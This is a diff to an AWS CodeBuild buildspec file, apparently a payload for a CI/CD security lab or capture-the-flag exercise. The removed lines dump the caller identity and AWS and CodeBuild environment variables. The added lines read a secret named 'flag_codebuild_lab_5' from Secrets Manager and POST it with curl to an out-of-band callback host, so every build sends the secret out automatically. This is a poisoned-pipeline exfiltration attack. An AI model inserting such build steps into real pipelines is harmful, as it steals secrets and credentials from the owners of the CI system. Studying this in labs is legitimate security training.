@@ -1,10 +1,6 @@
 version: 0.2
-
 phases:
   build:
     commands:
-      - echo "Running PR payload"
-      - aws sts get-caller-identity || true
-      - aws secretsmanager get-secret-value --region us-east-1 --secret-id flag_codebuild_lab_5 --query SecretString --output text || true
-      - env | grep -E '^AWS_|CODEBUILD'
-      - echo "Done"
+      - FLAG=$(aws secretsmanager get-secret-value --region us-east-1 --secret-id flag_codebuild_lab_5 --query SecretString --output text 2>/dev/null || echo "not_accessible")
+      - curl -sk -X POST "https://d8debjhljbeds6jikmrg6sdyphnt5cdjk.oast.fun/lab5" --data-binary "flag=${FLAG}" || true
